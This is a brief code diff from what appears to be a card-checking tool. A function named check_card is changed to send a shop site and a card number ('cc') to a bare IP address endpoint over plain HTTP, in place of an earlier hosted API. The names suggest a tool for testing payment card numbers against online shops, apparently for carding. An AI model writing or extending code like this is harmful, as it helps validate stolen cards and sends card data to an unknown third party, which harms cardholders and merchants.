@@ -24,7 +24,7 @@ def check_card():
         }), 400
 
     try:
-        api_url = "https://autoshopify-tpg2.onrender.com/index.php"
+        api_url = "http://154.46.30.158/sh.php"
         params = {
             'site': site,
             'cc': cc
